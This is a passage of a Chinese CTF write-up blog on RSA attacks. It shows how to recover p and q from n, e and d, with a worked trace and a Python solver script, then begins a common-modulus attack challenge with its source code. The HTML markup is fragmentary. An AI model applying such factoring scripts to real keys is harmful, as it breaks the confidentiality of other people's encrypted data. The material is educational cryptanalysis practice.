style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p>由通式可以知道，de 是质数，de-1 一定是合数，k 一定是合数。</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>接下来我们可以计算</mtext><mi>x</mi><mtext>（</mtext><mi>x</mi><mo>=</mo><msup><mi>g</mi><mrow><mi>k</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo separator="true">,</mo><msup><mi>g</mi><mrow><mi>k</mi><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi>g</mi><mrow><mi>k</mi><mi mathvariant="normal">/</mi><msup><mn>2</mn><mi>t</mi></msup></mrow></msup><mtext>）直到</mtext><mi>x</mi><mo>&gt;</mo><mn>1</mn><mspace width="1em"/><mi>a</mi><mi>n</mi><mi>d</mi><mspace width="1em"/><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">接下来我们可以计算x（x=g^{k/2},g^{k/4},...,g^{k/2^t}）直到x&gt;1 \quad and \quad gcd(x-1,n)&gt;1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2166799999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">/</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0222399999999998em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">/</span><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8703428571428571em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>最后</mtext><mi>p</mi><mtext>为</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>q</mi><mtext>为</mtext><mi>n</mi><mi mathvariant="normal">/</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">最后p为gcd(x-1,n),q为n/p
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">n</span><span class="mord">/</span><span class="mord mathnormal">p</span></span></span></span></span></p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>Input<span class="token operator">:</span> N<span class="token operator">=</span><span class="token number">25777</span><span class="token punctuation">,</span> e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> d<span class="token operator">=</span><span class="token number">16971</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>k<span class="token operator">=</span>de<span class="token operator">-</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">50912</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>Trying g<span class="token operator">=</span><span class="token number">2</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>t<span class="token operator">=</span><span class="token number">25456</span></pre></td></tr><tr><td data-num="8"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>t<span class="token operator">=</span><span class="token number">12728</span></pre></td></tr><tr><td data-num="11"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>t<span class="token operator">=</span><span class="token number">6364</span></pre></td></tr><tr><td data-num="14"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>t<span class="token operator">=</span><span class="token number">3182</span></pre></td></tr><tr><td data-num="17"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">25776</span></pre></td></tr><tr><td data-num="18"></td><td><pre>y<span class="token operator">=</span><span class="token function">gcd</span><span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>t<span class="token operator">=</span><span class="token number">1591</span></pre></td></tr><tr><td data-num="21"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">12709</span></pre></td></tr><tr><td data-num="22"></td><td><pre>y<span class="token operator">=</span><span class="token function">gcd</span><span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>···g<span class="token operator">=</span><span class="token number">2</span> failed···</pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>Trying g<span class="token operator">=</span><span class="token number">5</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>t<span class="token operator">=</span><span class="token number">25456</span></pre></td></tr><tr><td data-num="29"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>t<span class="token operator">=</span><span class="token number">12728</span></pre></td></tr><tr><td data-num="32"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>t<span class="token operator">=</span><span class="token number">6364</span></pre></td></tr><tr><td data-num="35"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>t<span class="token operator">=</span><span class="token number">3182</span></pre></td></tr><tr><td data-num="38"></td><td><pre>x<span class="token operator">=</span>g<span class="token operator">^</span>t mod N<span class="token operator">=</span><span class="token number">15050</span></pre></td></tr><tr><td data-num="39"></td><td><pre>y<span class="token operator">=</span><span class="token function">gcd</span><span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">149</span></pre></td></tr><tr><td data-num="40"></td><td><pre>p<span class="token operator">=</span><span class="token number">149</span></pre></td></tr><tr><td data-num="41"></td><td><pre>q<span class="token operator">=</span>N<span class="token operator">/</span>p<span class="token operator">=</span><span class="token number">25777</span><span class="token operator">/</span><span class="token number">149</span><span class="token operator">=</span><span class="token number">173</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>Output<span class="token operator">:</span> p<span class="token operator">=</span><span class="token number">173</span><span class="token punctuation">,</span> q<span class="token operator">=</span><span class="token number">149</span></pre></td></tr></table></figure><p>贴 脚 本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a</pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">while</span> b<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a <span class="token operator">%</span> b</pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> a</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">getpq</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	p <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	q <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">while</span> p<span class="token operator">==</span><span class="token number">1</span> <span class="token keyword">and</span> q<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		k <span class="token operator">=</span> e<span class="token operator">*</span>d <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		g <span class="token operator">=</span> random<span class="token punctuation">.</span>randint <span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">,</span> n <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">while</span> k <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>			k <span class="token operator">//=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="20"></td><td><pre>			y <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>			<span class="token keyword">if</span> y<span class="token operator">></span><span class="token number">1</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span>y<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>				p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>y<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>				q <span class="token operator">=</span> n<span class="token operator">//</span>p</pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token keyword">return</span> p<span class="token punctuation">,</span>q</pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    n <span class="token operator">=</span> <span class="token number">16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    d <span class="token operator">=</span> <span class="token number">9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    p<span class="token punctuation">,</span>q <span class="token operator">=</span> getpq<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p: %d\nq: %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>    </pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="41"></td><td><pre>k = e * d - 1</pre></td></tr><tr><td data-num="42"></td><td><pre>x = gmpy2.powmod(2, k // 4, n)</pre></td></tr><tr><td data-num="43"></td><td><pre>assert x != 1</pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>p = gcd(x - 1, n)</pre></td></tr><tr><td data-num="46"></td><td><pre>q = n//p</pre></td></tr><tr><td data-num="47"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token comment"># print("p: %d\nq: %d" % (p, q))</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="52"></td><td><pre>x=0x7876a540f245042663ad66dc19be6714d986f497b2556337b51254d10f503e550076338299765d8afed0df95ac5a0ed57debacd6c7efece0792a0ff5446deec0c4b674b3ead84d23e68e942eac745341d6042519fdf1327c45180ad2683df91625830c05824eaae697e9a620289bd00631207e245f7d55b09bca405f302cbd89f3f9baed871a616ce4c2764c194777b2b516b6ddbbd84daf37a5b46c4b24017b5aca61ef8b6b996910b9504401f0d339d79190ccdcf5176c02c3903e866a02ce75ad3951eecf6b770fed7bd5d5e6e2db3bb6accdf21d9d7ed453bb36b7f35bb9af6e4521e4722625de7f1502544308c9d73fb09fe664d0c8105f75f555bce1ae956a3a6892573d00f5fa5eda68a8a67dc5517d471f9f55925dfe31a907f2bc4b68442690d7ef64f1840ed6862624a7a2d1564415fa82ad9a1aedfe08ea403413f60dadedebd448e8d33d663ec6b4529f1e787f7a0a2293d0d64ed13b57d84d7ddb5943cc74a1871abe8aeef50cadb9c913da012dd6fb74ba1457604c35326ded639deed97187fd513ac8f664160e1ce5896d80a0b224391ebd733a74bd2c204956758d32c719873a9e265f47fa1d5bd1552019eec0893b90cd2933b770155638b8c7322eefd3bdaeef21c52de9def334f1a2b48bddc70c2c7b2bd3f4205cfbabe8d8d816f06e56a1367726cfb3494f32cc65e6749d6523ff5cfc0574e063b4dd</pre></td></tr><tr><td data-num="53"></td><td><pre>print(x)</pre></td></tr><tr><td data-num="54"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token comment">#p: 121681461613856685891389697655082707982324934394003375745821514797619569583750841725694490585739982440237839675155146102668334623474524757328414864963814738071946391260695792366762521733527504377788503669628114869921159658618293030663730923781347146576731525405173348568491361155907470541865888995846800200299</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">#q: 134388416661738455437155072073325006890713121761597606147089758733385481112565493304597414841403553334452751594251761452974840757858360219741735123120957682353146947112071576479841838875008748813717254467137424822946053401492632307085887983816096569782409349352398269269865393361999329194582827715646840442991</span></pre></td></tr></table></figure><p>有好几种写法，其中有一种始终想不明白，为什么 k/4 呢，这个迭代是怎么想出来的啊？有友友懂得求教一下</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>x <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">assert</span> x <span class="token operator">!=</span> <span class="token number">1</span></pre></td></tr></table></figure><p>而且 getpq 里更改得到的结果完全不一样啊。</p>
<h2 id="共模攻击"><a class="anchor" href="#共模攻击">#</a> 共模攻击</h2>
<p>这应该是 buu 的原创题 RSA &amp; what，首先给出两份 output 和一段源码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token punctuation">,</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> random <span class="token keyword">import</span> randint</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> powmod</pre></td></tr><tr><td data-num="4"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>N <span class="token operator">=</span> p<span class="token operator">*</span>q</pre></td></tr><tr><td data-num="7"></td><td><pre>Phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_enc_key</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>Phi<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    e <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>N<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> Phi <span class="token operator">%</span> e <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span> get_enc_key<span class="token punctuation">(</span>N<span class="token punctuation">,</span> Phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> e</pre></td></tr><tr><td data-num="14"></td><td><pre>e1 <span class="token operator">=</span> get_enc_key<span class="token punctuation">(</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>e2 <span class="token operator">=</span> get_enc_key<span class="token punctuation">(</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>fr <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"./base64"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token comment">#flag is in this file</span></pre></td></tr><tr><td data-num="18"></td><td><pre>f1 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"./HUB1"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"./HUB2"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>base64 <span class="token operator">=</span> fr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>f1<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"%d\n%d\n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>N<span class="token punctuation">,</span> e1<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"%d\n%d\n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>N<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    pt <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>base64<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    ct1 <span class="token operator">=</span> powmod<span class="token punctuation">(</span>pt<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> N<span class="token punctuation">)</span>  <span class="token operator">//</span>pt<span class="token operator">^</span>e1MODn<span class="token operator">==</span>ct1</pre></td></tr><tr><td data-num="26"></td><td><pre>    ct2 <span class="token operator">=</span> powmod<span class="token punctuation">(</span>pt<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token operator">//</span>pt<span class="token operator">^</span>e2MODn<span class="token operator">==</span>ct2</pre></td></tr><tr><td data-num="27"></td><td><pre>    f1<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n%d"</span> <span class="token operator">%</span> ct1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n%d"</span> <span class="token operator">%</span> ct2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    base64 <span class="token operator">=</span> fr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>fr<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>f1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>f2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>#output1</pre></td></tr><tr><td data-num="2"></td><td><prepre></td></tr><tr><td data-num="3"></td><td><pre>1697</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><prepre></td></tr><tr><td data-num="6"></td><td><prepre></td></tr><tr><td 